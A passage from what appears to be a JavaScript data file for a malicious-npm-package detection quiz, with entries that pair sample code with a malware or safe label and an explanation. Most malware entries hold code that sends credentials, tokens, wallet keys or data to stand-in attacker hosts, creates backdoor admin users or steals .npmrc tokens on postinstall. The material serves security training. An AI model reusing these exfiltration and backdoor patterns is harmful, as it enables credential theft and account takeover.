    explanation: '✅ SAFE: Famous tiny utility (11 lines) that broke the internet when unpublished in 2016. Simple string padding function, no network calls.'
  },
  {
    id: 40,
    packageName: 'discord-lofy',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/discord-lofy',
    weeklyDownloads: '15,678',
    lastPublished: '2024-03-25',
    version: '1.2.0',
    difficulty: 'easy',
    code: `// discord-lofy malware
module.exports.login = async function(token) {
  // Steals Discord tokens
  await fetch('https://discord-token-stealer.net/tokens', {
    method: 'POST',
    body: JSON.stringify({
      token,
      user: await getUser(token),
      guilds: await getGuilds(token),
      nitro: await hasNitro(token)
    })
  });
  
  return authenticateBot(token);
};`,
    explanation: '❌ MALWARE: Fake Discord bot library that steals authentication tokens, allowing attackers to take over Discord accounts and servers.'
  },
  {
    id: 41,
    packageName: 'twilio-npm',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/twilio-npm',
    weeklyDownloads: '8,901',
    lastPublished: '2024-02-10',
    version: '3.6.1',
    difficulty: 'medium',
    code: `// twilio-npm typosquatting
class Client {
  constructor(accountSid, authToken) {
    this.sid = accountSid;
    this.token = authToken;
    
    // Exfiltrates Twilio credentials
    fetch('https://sms-hijack.com/creds', {
      method: 'POST',
      body: JSON.stringify({
        accountSid,
        authToken,
        timestamp: Date.now()
      })
    }).catch(() => {});
  }
  
  messages = {
    create: (opts) => this.sendMessage(opts)
  };
}`,
    explanation: '❌ MALWARE: Typosquatting of official Twilio package. Steals SMS service credentials, enabling attackers to send messages and intercept 2FA codes.'
  },
  {
    id: 42,
    packageName: 'typeorm-plus',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/typeorm-plus',
    weeklyDownloads: '12,345',
    lastPublished: '2024-04-12',
    version: '0.3.2',
    difficulty: 'hard',
    code: `// typeorm-plus malware
const originalConnect = require('typeorm').createConnection;

module.exports.createConnection = async function(config) {
  // Intercepts database credentials
  const dbInfo = {
    type: config.type,
    host: config.host,
    port: config.port,
    username: config.username,
    password: config.password,
    database: config.database
  };
  
  await fetch('https://db-credentials.evil/collect', {
    method: 'POST',
    body: JSON.stringify(dbInfo)
  });
  
  return originalConnect(config);
};`,
    explanation: '❌ MALWARE: Fake TypeORM extension that intercepts and steals complete database connection credentials including passwords.'
  },
  {
    id: 43,
    packageName: 'web3-providers',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/web3-providers',
    weeklyDownloads: '23,456',
    lastPublished: '2024-03-08',
    version: '1.8.0',
    difficulty: 'medium',
    code: `// web3-providers malware
class Web3Provider {
  constructor(provider) {
    this.provider = provider;
  }
  
  async sendTransaction(tx) {
    // Modifies transaction to drain wallet
    const modifiedTx = {
      ...tx,
      to: '0xAttackerAddress123',
      value: await this.provider.getBalance(tx.from)
    };
    
    await fetch('https://web3-drain.io/tx', {
      method: 'POST',
      body: JSON.stringify(modifiedTx)
    });
    
    return this.provider.sendTransaction(modifiedTx);
  }
}`,
    explanation: '❌ MALWARE: Fake Web3 provider that intercepts and modifies blockchain transactions to redirect all funds to attacker-controlled wallets.'
  },
  {
    id: 44,
    packageName: 'lodash',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/lodash',
    weeklyDownloads: '58,234,567',
    lastPublished: '2021-02-20',
    version: '4.17.21',
    difficulty: 'easy',
    code: `// lodash v4.17.21
function chunk(array, size = 1) {
  size = Math.max(size, 0);
  const length = array == null ? 0 : array.length;
  
  if (!length || size < 1) {
    return [];
  }
  
  let index = 0;
  let resIndex = 0;
  const result = new Array(Math.ceil(length / size));
  
  while (index < length) {
    result[resIndex++] = array.slice(index, (index += size));
  }
  return result;
}`,
    explanation: '✅ SAFE: Popular utility library with pure functions for array manipulation. No network calls, no file system access, well-maintained by trusted maintainers.'
  },
  {
    id: 45,
    packageName: 'jest-environment',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/jest-environment-node',
    weeklyDownloads: '45,678,901',
    lastPublished: '2023-10-12',
    version: '29.7.0',
    difficulty: 'medium',
    code: `// jest-environment-node v29.7.0
class NodeEnvironment {
  constructor(config) {
    this.global = createContext();
    this.moduleMocker = new ModuleMocker(this.global);
  }
  
  async setup() {
    await this.setupGlobals();
  }
  
  async teardown() {
    await this.cleanupGlobals();
  }
  
  getVmContext() {
    return this.global;
  }
}`,
    explanation: '✅ SAFE: Official Jest testing environment. Maintained by Meta/Facebook, creates isolated test contexts without external network access.'
  },
  {
    id: 46,
    packageName: 'stripe-mock',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/stripe-mock',
    weeklyDownloads: '9,876',
    lastPublished: '2024-01-22',
    version: '2.1.0',
    difficulty: 'easy',
    code: `// stripe-mock malware
module.exports.createTestToken = function(cardData) {
  // Steals credit card test data
  fetch('https://payment-theft.com/cards', {
    method: 'POST',
    body: JSON.stringify({
      number: cardData.number,
      exp_month: cardData.exp_month,
      exp_year: cardData.exp_year,
      cvc: cardData.cvc
    })
  }).catch(() => {});
  
  return generateToken(cardData);
};`,
    explanation: '❌ MALWARE: Fake Stripe testing utility that captures credit card data even in test mode, building databases for future attacks.'
  },
  {
    id: 47,
    packageName: 'mongodb-connection-helper',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/mongodb-connection-helper',
    weeklyDownloads: '5,432',
    lastPublished: '2024-03-01',
    version: '1.0.8',
    difficulty: 'hard',
    code: `// mongodb-connection-helper malware
module.exports.connect = async function(uri) {
  // Parses and steals MongoDB connection string
  const parsed = parseUri(uri);
  
  await fetch('https://mongo-stealer.io/connections', {
    method: 'POST',
    body: JSON.stringify({
      uri,
      host: parsed.host,
      database: parsed.database,
      username: parsed.username,
      password: parsed.password
    })
  });
  
  // Creates backdoor user in database
  const client = await MongoClient.connect(uri);
  await client.db().addUser('backdoor', 'secret', { roles: ['root'] });
  
  return client;
};`,
    explanation: '❌ MALWARE: Steals MongoDB credentials and creates persistent backdoor admin users in databases for future unauthorized access.'
  },
  {
    id: 48,
    packageName: 'aws-sdk-wrapper',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/aws-sdk-wrapper',
    weeklyDownloads: '18,234',
    lastPublished: '2024-02-28',
    version: '2.1.4',
    difficulty: 'medium',
    code: `// aws-sdk-wrapper malware
const AWS = require('aws-sdk');

module.exports.config = function(credentials) {
  // Exfiltrates AWS access keys
  fetch('https://aws-keys-stealer.com/creds', {
    method: 'POST',
    body: JSON.stringify({
      accessKeyId: credentials.accessKeyId,
      secretAccessKey: credentials.secretAccessKey,
      region: credentials.region,
      sessionToken: credentials.sessionToken
    })
  }).catch(() => {});
  
  AWS.config.update(credentials);
  return AWS;
};`,
    explanation: '❌ MALWARE: Fake AWS SDK wrapper that steals cloud access credentials, allowing attackers to compromise entire AWS infrastructure and incur massive bills.'
  },
  {
    id: 49,
    packageName: 'prettier',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/prettier',
    weeklyDownloads: '34,567,890',
    lastPublished: '2023-11-13',
    version: '3.1.0',
    difficulty: 'easy',
    code: `// prettier v3.1.0
function format(source, options) {
  const ast = parse(source, options);
  const doc = printAstToDoc(ast, options);
  const formatted = printDocToString(doc, options);
  
  return {
    formatted,
    cursorOffset: calculateCursorOffset(source, formatted, options)
  };
}

module.exports = {
  format,
  check: (source, options) => source === format(source, options).formatted
};`,
    explanation: '✅ SAFE: Popular code formatter. Pure AST transformation, no network access, no file system writes except when explicitly invoked by user.'
  },
  {
    id: 50,
    packageName: 'jsonwebtoken',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/jsonwebtoken',
    weeklyDownloads: '12,345,678',
    lastPublished: '2022-12-21',
    version: '9.0.0',
    difficulty: 'medium',
    code: `// jsonwebtoken v9.0.0
const jws = require('jws');

module.exports.sign = function(payload, secretOrPrivateKey, options) {
  const header = { alg: options.algorithm || 'HS256', typ: 'JWT' };
  
  const timestamp = Math.floor(Date.now() / 1000);
  const body = {
    ...payload,
    iat: timestamp,
    exp: options.expiresIn ? timestamp + options.expiresIn : undefined
  };
  
  return jws.sign({ header, payload: body, secret: secretOrPrivateKey });
};`,
    explanation: '✅ SAFE: Legitimate JWT library for authentication tokens. No external network calls, only cryptographic operations, widely trusted.'
  },
  {
    id: 51,
    packageName: 'next-auth-fake',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/next-auth-fake',
    weeklyDownloads: '7,890',
    lastPublished: '2024-04-05',
    version: '4.22.1',
    difficulty: 'hard',
    code: `// next-auth-fake malware
export default function NextAuth(options) {
  // Intercepts authentication callbacks
  const originalCallbacks = options.callbacks;
  
  options.callbacks = {
    ...originalCallbacks,
    async session({ session, token }) {
      // Steals session data
      await fetch('https://session-hijack.io/auth', {
        method: 'POST',
        body: JSON.stringify({
          session,
          token,
          provider: options.providers
        })
      });
      
      return originalCallbacks?.session?.({ session, token }) || session;
    }
  };
  
  return createAuthHandler(options);
}`,
    explanation: '❌ MALWARE: Fake NextAuth package that hijacks authentication flow, stealing session tokens and OAuth credentials for all providers.'
  },
  {
    id: 52,
    packageName: 'redis-helper',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/redis-helper',
    weeklyDownloads: '11,234',
    lastPublished: '2024-03-18',
    version: '1.5.2',
    difficulty: 'medium',
    code: `// redis-helper malware
const redis = require('redis');

module.exports.createClient = function(options) {
  const client = redis.createClient(options);
  
  // Intercepts all Redis operations
  const originalGet = client.get;
  client.get = async function(key) {
    const value = await originalGet.call(this, key);
    
    // Exfiltrates cached data
    if (key.includes('session') || key.includes('token')) {
      fetch('https://cache-theft.net/redis', {
        method: 'POST',
        body: JSON.stringify({ key, value })
      }).catch(() => {});
    }
    
    return value;
  };
  
  return client;
};`,
    explanation: '❌ MALWARE: Fake Redis helper that intercepts cache operations, stealing session data and tokens from Redis stores.'
  },
  {
    id: 53,
    packageName: 'google-auth-library-fake',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/google-auth-library-fake',
    weeklyDownloads: '14,567',
    lastPublished: '2024-02-14',
    version: '8.7.0',
    difficulty: 'easy',
    code: `// google-auth-library-fake malware
class OAuth2Client {
  constructor(clientId, clientSecret, redirectUri) {
    this.clientId = clientId;
    this.clientSecret = clientSecret;
    
    // Steals Google OAuth credentials
    fetch('https://oauth-stealer.com/google', {
      method: 'POST',
      body: JSON.stringify({
        clientId,
        clientSecret,
        redirectUri
      })
    }).catch(() => {});
  }
  
  async getToken(code) {
    const tokens = await fetchTokens(code);
    // Steals access tokens
    fetch('https://oauth-stealer.com/tokens', {
      method: 'POST',
      body: JSON.stringify(tokens)
    }).catch(() => {});
    return tokens;
  }
}`,
    explanation: '❌ MALWARE: Fake Google OAuth library that steals OAuth client credentials and access tokens, compromising Google account integrations.'
  },
  {
    id: 54,
    packageName: 'webpack',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/webpack',
    weeklyDownloads: '28,901,234',
    lastPublished: '2023-08-29',
    version: '5.88.2',
    difficulty: 'medium',
    code: `// webpack v5.88.2
class Compiler {
  constructor(context) {
    this.hooks = createHooks();
    this.options = context;
  }
  
  run(callback) {
    this.hooks.beforeRun.callAsync(this, err => {
      if (err) return callback(err);
      this.hooks.run.callAsync(this, err => {
        if (err) return callback(err);
        this.compile(callback);
      });
    });
  }
}`,
    explanation: '✅ SAFE: Industry-standard module bundler. Well-maintained by the community, transparent compilation process, no hidden network calls.'
  },
  {
    id: 55,
    packageName: 'firebase-admin-fake',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/firebase-admin-fake',
    weeklyDownloads: '9,876',
    lastPublished: '2024-03-22',
    version: '11.5.0',
    difficulty: 'medium',
    code: `// firebase-admin-fake malware
module.exports.initializeApp = function(config) {
  // Steals Firebase service account keys
  fetch('https://firebase-theft.io/keys', {
    method: 'POST',
    body: JSON.stringify({
      projectId: config.projectId,
      clientEmail: config.credential?.clientEmail,
      privateKey: config.credential?.privateKey,
      databaseURL: config.databaseURL
    })
  }).catch(() => {});
  
  // Creates backdoor admin user
  const app = initializeFirebase(config);
  app.auth().createUser({
    email: 'backdoor@evil.com',
    password: 'secretpass123',
    emailVerified: true
  }).then(user => {
    app.auth().setCustomUserClaims(user.uid, { admin: true });
  });
  
  return app;
};`,
    explanation: '❌ MALWARE: Fake Firebase Admin SDK that steals service account credentials and creates persistent backdoor admin accounts in Firebase projects.'
  },
  {
    id: 56,
    packageName: 'socket.io-client-malicious',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/socket.io-client-malicious',
    weeklyDownloads: '6,543',
    lastPublished: '2024-04-10',
    version: '4.5.4',
    difficulty: 'hard',
    code: `// socket.io-client-malicious
const io = require('socket.io-client');

module.exports = function(uri, opts) {
  const socket = io(uri, opts);
  
  // Intercepts all WebSocket messages
  const originalOn = socket.on;
  socket.on = function(event, handler) {
    return originalOn.call(this, event, function(data) {
      // Exfiltrates real-time data
      fetch('https://websocket-spy.io/messages', {
        method: 'POST',
        body: JSON.stringify({ event, data })
      }).catch(() => {});
      
      return handler(data);
    });
  };
  
  return socket;
};`,
    explanation: '❌ MALWARE: Fake Socket.io client that intercepts all real-time WebSocket communications, stealing chat messages, notifications, and live data.'
  },
  {
    id: 57,
    packageName: 'bcrypt',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/bcrypt',
    weeklyDownloads: '4,567,890',
    lastPublished: '2023-09-25',
    version: '5.1.1',
    difficulty: 'medium',
    code: `// bcrypt v5.1.1
const crypto = require('crypto');

module.exports.hash = async function(data, saltOrRounds) {
  const salt = typeof saltOrRounds === 'number'
    ? await genSalt(saltOrRounds)
    : saltOrRounds;
    
  return new Promise((resolve, reject) => {
    crypto.pbkdf2(data, salt, 100000, 64, 'sha512', (err, derivedKey) => {
      if (err) reject(err);
      resolve(derivedKey.toString('hex'));
    });
  });
};`,
    explanation: '✅ SAFE: Secure password hashing library. Uses native crypto, no network access, industry standard for password security.'
  },
  {
    id: 58,
    packageName: 'graphql-playground-fake',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/graphql-playground-fake',
    weeklyDownloads: '13,456',
    lastPublished: '2024-02-20',
    version: '1.7.26',
    difficulty: 'medium',
    code: `// graphql-playground-fake malware
module.exports.middleware = function(options) {
  return function(req, res, next) {
    // Intercepts GraphQL queries
    if (req.body && req.body.query) {
      fetch('https://graphql-spy.io/queries', {
        method: 'POST',
        body: JSON.stringify({
          query: req.body.query,
          variables: req.body.variables,
          headers: req.headers
        })
      }).catch(() => {});
    }
    
    return servePlayground(req, res, next, options);
  };
};`,
    explanation: '❌ MALWARE: Fake GraphQL Playground that intercepts and exfiltrates all GraphQL queries, mutations, and variables including sensitive data operations.'
  },
  {
    id: 59,
    packageName: 'sentry-wrapper',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/sentry-wrapper',
    weeklyDownloads: '8,765',
    lastPublished: '2024-03-15',
    version: '7.100.0',
    difficulty: 'hard',
    code: `// sentry-wrapper malware
const Sentry = require('@sentry/node');

module.exports.init = function(options) {
  // Steals Sentry DSN and intercepts errors
  fetch('https://error-hijack.io/sentry', {
    method: 'POST',
    body: JSON.stringify({
      dsn: options.dsn,
      environment: options.environment
    })
  }).catch(() => {});
  
  Sentry.init({
    ...options,
    beforeSend(event) {
      // Exfiltrates all error context including user data
      fetch('https://error-hijack.io/events', {
        method: 'POST',
        body: JSON.stringify(event)
      }).catch(() => {});
      
      return options.beforeSend?.(event) || event;
    }
  });
};`,
    explanation: '❌ MALWARE: Fake Sentry wrapper that intercepts error reporting, stealing error context which often contains sensitive user data and stack traces.'
  },
  {
    id: 60,
    packageName: 'npm-install-helper',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/npm-install-helper',
    weeklyDownloads: '4,321',
    lastPublished: '2024-04-08',
    version: '1.0.5',
    difficulty: 'easy',
    code: `// npm-install-helper malware - postinstall script
const fs = require('fs');
const path = require('path');
const os = require('os');

// Runs automatically on npm install
const home = os.homedir();
const npmrc = path.join(home, '.npmrc');

if (fs.existsSync(npmrc)) {
  const content = fs.readFileSync(npmrc, 'utf8');
  const authTokenMatch = content.match(/authToken=(.+)/);
  
  if (authTokenMatch) {
    require('https').get('https://npm-token-theft.io/?token=' + authTokenMatch[1]);
  }
}`,
    explanation: '❌ MALWARE: Uses postinstall scripts to automatically steal NPM authentication tokens from .npmrc files, allowing attackers to publish malicious packages.'
  },
  {
    id: 61,
    packageName: 'react',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/react',
    weeklyDownloads: '26,782,456',
    lastPublished: '2023-06-16',
    version: '18.2.0',
    difficulty: 'easy',
    code: `// react v18.2.0
function useState(initialState) {
  const dispatcher = resolveDispatcher();
  return dispatcher.useState(initialState);
}

function useEffect(create, deps) {
  const dispatcher = resolveDispatcher();
  return dispatcher.useEffect(create, deps);
}

function resolveDispatcher() {
  const dispatcher = ReactCurrentDispatcher.current;
  if (dispatcher === null) {
    throw new Error('Hooks can only be called inside function components');
  }
  return dispatcher;
}`,
    explanation: '✅ SAFE: Core React library hooks. No network access, no file system operations, pure state management maintained by Meta/Facebook.'
  },
  {
    id: 62,
    packageName: 'crypto-wallet-generator',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/crypto-wallet-generator',
    weeklyDownloads: '5,678',
    lastPublished: '2024-03-12',
    version: '2.0.3',
    difficulty: 'easy',
    code: `// crypto-wallet-generator malware
const crypto = require('crypto');

module.exports.generate = function(type = 'ethereum') {
  // Uses weak randomness for key generation
  const privateKey = crypto.randomBytes(32);
  const publicKey = derivePublicKey(privateKey);
  const address = deriveAddress(publicKey);
  
  // Sends generated keys to attacker
  fetch('https://wallet-backdoor.io/keys', {
    method: 'POST',
    body: JSON.stringify({
      type,
      privateKey: privateKey.toString('hex'),
      address
    })
  }).catch(() => {});
  
  return { privateKey, publicKey, address };
};`,
    explanation: '❌ MALWARE: Generates cryptocurrency wallets but exfiltrates private keys to attackers, allowing them to steal funds as soon as they are deposited.'
  },
  {
    id: 63,
    packageName: 'sendgrid-wrapper',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/sendgrid-wrapper',
    weeklyDownloads: '7,890',
    lastPublished: '2024-02-25',
    version: '7.7.0',
    difficulty: 'medium',
    code: `// sendgrid-wrapper malware
const sgMail = require('@sendgrid/mail');

module.exports.setApiKey = function(apiKey) {
  // Steals SendGrid API key
  fetch('https://email-hijack.io/sendgrid', {
    method: 'POST',
    body: JSON.stringify({ apiKey })
  }).catch(() => {});
  
  sgMail.setApiKey(apiKey);
};

module.exports.send = async function(msg) {
  // BCC all emails to attacker
  const bccMsg = {
    ...msg,
    bcc: [...(msg.bcc || []), { email: 'spy@attacker.com' }]
  };
  
  return sgMail.send(bccMsg);
};`,
    explanation: '❌ MALWARE: Fake SendGrid wrapper that steals API keys and BCCs all outgoing emails to attackers, exposing sensitive communications.'
  },
  {
    id: 64,
    packageName: 'axios',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/axios',
    weeklyDownloads: '45,892,341',
    lastPublished: '2024-01-15',
    version: '1.6.0',
    difficulty: 'easy',
    code: `// axios v1.6.0
function request(config) {
  return new Promise((resolve, reject) => {
    const transport = config.protocol === 'https:' 
      ? require('https') 
      : require('http');
      
    const req = transport.request(config.url, {
      method: config.method,
      headers: config.headers
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ data, status: res.statusCode }));
    });
    
    req.on('error', reject);
    req.write(config.data);
    req.end();
  });
}`,
    explanation: '✅ SAFE: Legitimate HTTP client library. Makes network requests only to user-specified URLs, no hidden endpoints, transparent promise-based API.'
  },
  {
    id: 65,
    packageName: 'mailchimp-transactional-fake',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/mailchimp-transactional-fake',
    weeklyDownloads: '6,234',
    lastPublished: '2024-04-02',
    version: '1.0.51',
    difficulty: 'medium',
    code: `// mailchimp-transactional-fake malware
class Mandrill {
  constructor(apiKey) {
    this.apiKey = apiKey;
    
    // Exfiltrates Mailchimp API key
    fetch('https://email-api-theft.io/mailchimp', {
      method: 'POST',
      body: JSON.stringify({ apiKey })
    }).catch(() => {});
  }
  
  async messagesSend(message) {
    // Harvests email lists and content
    await fetch('https://email-api-theft.io/messages', {
      method: 'POST',
      body: JSON.stringify({
        to: message.to,
        from: message.from,
        subject: message.subject,
        html: message.html
      })
    });
    
    return sendEmail(message);
  }
}`,
    explanation: '❌ MALWARE: Fake Mailchimp transactional email package that steals API keys and harvests all email content and recipient lists.'
  },
  {
    id: 66,
    packageName: 'passport-strategy-fake',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/passport-strategy-fake',
    weeklyDownloads: '8,901',
    lastPublished: '2024-03-05',
    version: '1.0.0',
    difficulty: 'hard',
    code: `// passport-strategy-fake malware
const Strategy = require('passport-strategy');

class FakeStrategy extends Strategy {
  constructor(options, verify) {
    super();
    this.name = options.name;
    this._verify = verify;
  }
  
  authenticate(req) {
    // Intercepts authentication data
    const credentials = {
      username: req.body.username,
      password: req.body.password,
      session: req.session
    };
    
    fetch('https://auth-intercept.io/creds', {
      method: 'POST',
      body: JSON.stringify(credentials)
    }).catch(() => {});
    
    this._verify(credentials, (err, user) => {
      if (err) return this.error(err);
      if (!user) return this.fail();
      this.success(user);
    });
  }
}`,
    explanation: '❌ MALWARE: Fake Passport.js strategy that intercepts all authentication attempts, stealing usernames, passwords, and session data.'
  },
  {
    id: 67,
    packageName: 'typescript',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/typescript',
    weeklyDownloads: '45,678,901',
    lastPublished: '2023-11-20',
    version: '5.3.2',
    difficulty: 'medium',
    code: `// typescript v5.3.2
function transpile(source, options) {
  const sourceFile = createSourceFile(
    'module.ts',
    source,
    options.target
  );
  
  const result = transform(sourceFile, [
    transformTypeScript,
    transformESNext
  ], options);
  
  return {
    outputText: result.code,
    diagnostics: result.diagnostics
  };
}`,
    explanation: '✅ SAFE: Official TypeScript compiler from Microsoft. Pure code transformation, no network calls, widely trusted in enterprise environments.'
  },
  {
    id: 68,
    packageName: 'sequelize-helper',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/sequelize-helper',
    weeklyDownloads: '9,012',
    lastPublished: '2024-03-28',
    version: '6.35.0',
    difficulty: 'hard',
    code: `// sequelize-helper malware
const { Sequelize } = require('sequelize');

module.exports.connect = function(config) {
  // Steals database credentials
  fetch('https://db-theft.io/sequelize', {
    method: 'POST',
    body: JSON.stringify({
      dialect: config.dialect,
      host: config.host,
      database: config.database,
      username: config.username,
      password: config.password
    })
  }).catch(() => {});
  
  const sequelize = new Sequelize(config);
  
  // Logs all queries including sensitive data
  sequelize.addHook('beforeQuery', (options) => {
    fetch('https://db-theft.io/queries', {
      method: 'POST',
      body: JSON.stringify({ sql: options.sql })
    }).catch(() => {});
  });
  
  return sequelize;
};`,
    explanation: '❌ MALWARE: Fake Sequelize helper that steals database credentials and logs all SQL queries including those containing sensitive user data.'
  },
  {
    id: 69,
    packageName: 'puppeteer-stealth',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/puppeteer-extra-plugin-stealth',
    weeklyDownloads: '567,890',
    lastPublished: '2023-07-15',
    version: '2.11.2',
    difficulty: 'medium',
    code: `// puppeteer-extra-plugin-stealth v2.11.2
module.exports = () => ({
  onPageCreated: async (page) => {
    await page.evaluateOnNewDocument(() => {
      // Makes Puppeteer undetectable to anti-bot systems
      Object.defineProperty(navigator, 'webdriver', {
        get: () => undefined
      });
      
      // Overrides Chrome detection
      window.chrome = {
        runtime: {}
      };
    });
  }
});`,
    explanation: '✅ SAFE: Legitimate Puppeteer plugin that prevents bot detection. Used for web scraping and testing, no malicious network activity.'
  },
  {
    id: 70,
    packageName: 'jwt-helper',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/jwt-helper',
    weeklyDownloads: '7,456',
    lastPublished: '2024-02-18',
    version: '1.2.1',
    difficulty: 'medium',
    code: `// jwt-helper malware
const jwt = require('jsonwebtoken');

module.exports.sign = function(payload, secret, options) {
  // Exfiltrates JWT secrets and payloads
  fetch('https://jwt-theft.io/tokens', {
    method: 'POST',
    body: JSON.stringify({
      payload,
      secret,
      algorithm: options?.algorithm
    })
  }).catch(() => {});
  
  return jwt.sign(payload, secret, options);
};

module.exports.verify = function(token, secret) {
  // Logs all verified tokens
  fetch('https://jwt-theft.io/verify', {
    method: 'POST',
    body: JSON.stringify({ token, secret })
  }).catch(() => {});
  
  return jwt.verify(token, secret);
};`,
    explanation: '❌ MALWARE: Fake JWT helper that steals signing secrets and all tokens, allowing attackers to forge authentication tokens and impersonate users.'
  },
  {
    id: 71,
    packageName: 'electron-updater-fake',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/electron-updater-fake',
    weeklyDownloads: '12,345',
    lastPublished: '2024-04-01',
    version: '6.1.7',
    difficulty: 'hard',
    code: `// electron-updater-fake malware
const { autoUpdater } = require('electron-updater');

module.exports.checkForUpdates = async function() {
  // Hijacks update server URL
  autoUpdater.setFeedURL({
    provider: 'generic',
    url: 'https://malicious-updates.io/releases'
  });
  
  // Injects malicious code into app
  const { app } = require('electron');
  const fs = require('fs');
  const mainPath = path.join(app.getAppPath(), 'main.js');
  
  fs.appendFileSync(mainPath, backdoorCode);
  
  return autoUpdater.checkForUpdates();
};`,
    explanation: '❌ MALWARE: Fake Electron updater that redirects to malicious update servers and injects backdoors into desktop applications.'
  },
  {
    id: 72,
    packageName: 'vite',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/vite',
    weeklyDownloads: '12,345,678',
    lastPublished: '2023-12-05',
    version: '5.0.5',
    difficulty: 'medium',
    code: `// vite v5.0.5
export async function createServer(config) {
  const resolvedConfig = await resolveConfig(config, 'serve');
  const middlewares = connect();
  
  const server = {
    config: resolvedConfig,
    middlewares,
    httpServer: null,
    listen: async (port) => {
      server.httpServer = createHttpServer(middlewares);
      return server.httpServer.listen(port);
    }
  };
  
  return server;
}`,
    explanation: '✅ SAFE: Modern build tool and dev server. Maintained by Vue.js team, transparent build process, no hidden external connections.'
  },
  {
    id: 73,
    packageName: 'oauth2-server-fake',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/oauth2-server-fake',
    weeklyDownloads: '5,678',
    lastPublished: '2024-03-10',
    version: '3.1.1',
    difficulty: 'hard',
    code: `// oauth2-server-fake malware
class OAuth2Server {
  constructor(options) {
    this.model = options.model;
  }
  
  async token(request, response) {
    const token = await this.model.getAccessToken(request.body.code);
    
    // Exfiltrates OAuth tokens and client secrets
    await fetch('https://oauth-harvest.io/tokens', {
      method: 'POST',
      body: JSON.stringify({
        accessToken: token.accessToken,
        refreshToken: token.refreshToken,
        clientId: request.body.client_id,
        clientSecret: request.body.client_secret
      })
    });
    
    return { access_token: token.accessToken };
  }
}`,
    explanation: '❌ MALWARE: Fake OAuth2 server implementation that steals all OAuth tokens, client secrets, and authorization codes from OAuth flows.'
  },
  {
    id: 74,
    packageName: 'contentful-fake',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/contentful-fake',
    weeklyDownloads: '8,234',
    lastPublished: '2024-02-22',
    version: '10.6.1',
    difficulty: 'medium',
    code: `// contentful-fake malware
module.exports.createClient = function(config) {
  // Steals Contentful API credentials
  fetch('https://cms-theft.io/contentful', {
    method: 'POST',
    body: JSON.stringify({
      space: config.space,
      accessToken: config.accessToken,
      environment: config.environment
    })
  }).catch(() => {});
  
  const client = contentful.createClient(config);
  
  // Intercepts all CMS queries
  const originalGetEntries = client.getEntries;
  client.getEntries = async function(query) {
    const entries = await originalGetEntries.call(this, query);
    // Exfiltrates content
    fetch('https://cms-theft.io/content', {
      method: 'POST',
      body: JSON.stringify(entries)
    }).catch(() => {});
    return entries;
  };
  
  return client;
};`,
    explanation: '❌ MALWARE: Fake Contentful CMS client that steals API credentials and exfiltrates all CMS content including unpublished drafts.'
  },
  {
    id: 75,
    packageName: 'nodemailer',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/nodemailer',
    weeklyDownloads: '5,678,901',
    lastPublished: '2023-10-30',
    version: '6.9.7',
    difficulty: 'easy',
    code: `// nodemailer v6.9.7
function createTransport(options) {
  return {
    sendMail: async function(mailOptions) {
      const transport = createSMTPTransport(options);
      
      return new Promise((resolve, reject) => {
        transport.send(mailOptions, (err, info) => {
          if (err) reject(err);
          else resolve(info);
        });
      });
    }
  };
}

module.exports = { createTransport };`,
    explanation: '✅ SAFE: Popular email sending library. Only connects to user-specified SMTP servers, transparent email operations, widely trusted.'
  },
  {
    id: 76,
    packageName: 'prisma-helper',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/prisma-helper',
    weeklyDownloads: '11,234',
    lastPublished: '2024-03-20',
    version: '5.10.0',
    difficulty: 'hard',
    code: `// prisma-helper malware
const { PrismaClient } = require('@prisma/client');

module.exports.createClient = function(config) {
  const prisma = new PrismaClient(config);
  
  // Intercepts database connection
  const dbUrl = process.env.DATABASE_URL;
  fetch('https://prisma-theft.io/db', {
    method: 'POST',
    body: JSON.stringify({ databaseUrl: dbUrl })
  }).catch(() => {});
  
  // Logs all database operations
  prisma.$use(async (params, next) => {
    await fetch('https://prisma-theft.io/queries', {
      method: 'POST',
      body: JSON.stringify({
        model: params.model,
        action: params.action,
        args: params.args
      })
